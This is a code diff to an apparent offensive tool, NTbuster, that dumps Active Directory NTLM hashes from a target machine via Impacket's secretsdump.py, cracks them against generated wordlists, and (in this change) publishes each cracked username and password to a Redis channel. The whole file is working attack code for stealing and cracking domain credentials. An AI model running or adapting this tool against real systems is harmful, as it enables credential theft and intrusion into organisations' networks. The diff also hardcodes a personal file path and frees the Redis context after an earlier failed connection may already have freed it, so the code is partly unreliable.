@@ -14,10 +14,13 @@
 #include <cctype>
 #include <future>
 #include <algorithm>
+#include <hiredis/hiredis.h>
 using namespace std;
 
 class Cracker {
     public:
+        redisContext* redis;
+        const char* redis_channel;
         std::string ip_address;
         std::string username;
         std::string password;
@@ -104,7 +107,7 @@ class Cracker {
         }
 
 
-        void crack(const std::vector<string>& wordlist, const char* hash, const char* username){
+        void crack(const std::vector<string>& wordlist, const char* hash, const char* username, redisContext* redis, const char* redis_channel){
             for (std::size_t i = 0; i < wordlist.size(); i++) {
                 const char* generated_hash = gen_ntlm(wordlist[i]);
                 if (std::strcmp(hash, generated_hash) == 0) {
@@ -115,6 +118,19 @@ class Cracker {
                     "'" << wordlist[i] << "']" <<
                     "\033[0m" <<
                     std::endl;
+                    // Publish the message to the Redis channel
+                    redisReply* reply = nullptr;
+                    if (redis != nullptr) {
+                        reply = (redisReply*)redisCommand(redis, "PUBLISH %s '%s:%s'", redis_channel, username, wordlist[i].c_str());
+                    } else {
+                        std::cerr << "\033[1;31m[-] Could not connect to Redis server\033[0m" << std::endl;
+                    }
+                    if (reply != NULL) {
+                        freeReplyObject(reply);
+                    } else {
+                        std::cerr << "\033[1;31m[-] Could not publish message to Redis channel\033[0m" << std::endl;
+                    }
+
                     break;
                 }
             }
@@ -123,9 +139,9 @@ class Cracker {
         std::string get_ntds(int target_machine) {
             setenv("TARGET", target.c_str(), 1);
             if (target_machine == 1) {
-                system("/usr/bin/python3 ./vendor/scripts/secretsdump.py -just-dc-ntlm \"${TARGET}\" > /tmp/output.txt");
+                system("/usr/bin/python3 /Users/ch1nghz/Development/NTbuster/vendor/scripts/secretsdump.py -just-dc-ntlm \"${TARGET}\" > /tmp/output.txt");
             } else {
-                system("/usr/bin/python3 ./vendor/scripts/secretsdump.py \"${TARGET}\" > /tmp/output.txt");
+                system("/usr/bin/python3 /Users/ch1nghz/Development/NTbuster/vendor/scripts/secretsdump.py \"${TARGET}\" > /tmp/output.txt");
             }
 
             ifstream fin("/tmp/output.txt");
@@ -206,7 +222,7 @@ class Cracker {
                 std::cout << "\033[33m" << "[*] The password of '" << kv.first << "' is cracking..." << 
                     "\033[0m" << std::endl;
                 std::vector<string> wl = generate(kv.first);
-                auto future = std::async(std::launch::async, &Cracker::crack, this, wl, kv.second.c_str(), kv.first.c_str());
+                auto future = std::async(std::launch::async, &Cracker::crack, this, wl, kv.second.c_str(), kv.first.c_str(), redis, redis_channel);
                 futures.push_back(std::move(future));
             }
             std::for_each(futures.begin(), futures.end(), [](std::future<void>& f) {
@@ -280,6 +296,11 @@ class Cracker {
 };
 
 int main(int argc, char** argv) {
+    std::string ip_address, username, password;
+    int target_machine;
+    std::string python_check_command = "/usr/bin/python3 --version > /dev/null 2>&1";
+    std::string impacket_check_command = "/usr/bin/python3 -c \"import impacket\" > /dev/null 2>&1";
+    Cracker cracker;
     // draw banner
     const char* banner_text = "    _   __________               __           \n"
                      "   / | / /_  __/ /_  __  _______/ /____  _____\n"
@@ -287,9 +308,6 @@ int main(int argc, char** argv) {
                      " / /|  / / / / /_/ / /_/ (__  ) /_/  __/ /    \n"
                      "/_/ |_/ /_/ /_.___/\\__,_/____/\\__/\\___/_/     \n";
     cout << "\033[31m" << banner_text << "\033[0m" << endl;
-
-    std::string python_check_command = "/usr/bin/python3 --version > /dev/null 2>&1";
-    std::string impacket_check_command = "/usr/bin/python3 -c \"import impacket\" > /dev/null 2>&1";
  
     // Check if Python3 is installed
     if (system(python_check_command.c_str()) != 0) {
@@ -302,10 +320,21 @@ int main(int argc, char** argv) {
         std::cerr << "[-] Error: Impacket is not installed. Please install it by running 'pip3 install impacket'." << std::endl;
         return EXIT_FAILURE;
     }
+    // Create a Redis client
+    redisContext* redis = redisConnect("localhost", 6379);
+    if (redis == NULL || redis->err) {
+        if (redis) {
+            std::cerr << "\033[1;31m[-] Redis error: " << redis->errstr << "\033[0m" << std::endl;
+            redisFree(redis);
+        } else {
+            std::cerr << "\033[1;31m[-] Error: Could not allocate redis context\033[0m" << std::endl;
+        }
+    } else {
+        cracker.redis = redis;
+        cracker.redis_channel = "ntbuster";
+    }
+    
     CLI::App app{"NTbuster"};
-
-    std::string ip_address, username, password;
-    int target_machine;
 
     app.add_option("-t,--target-ip", ip_address, "Target IP address")->required();
     app.add_option("-u,--username", username, "Username")->required();
@@ -320,10 +349,13 @@ int main(int argc, char** argv) {
         std::cerr << "[-] Error: Target machine can be 1 or 2" << std::endl;
         return EXIT_FAILURE;
     }
+
     // Use the target value
-    Cracker cracker;
     cracker.target = target;
     cracker.launch(target_machine);
 
+    // Free the Redis client
+    redisFree(redis);
+    
     return 0;
 }
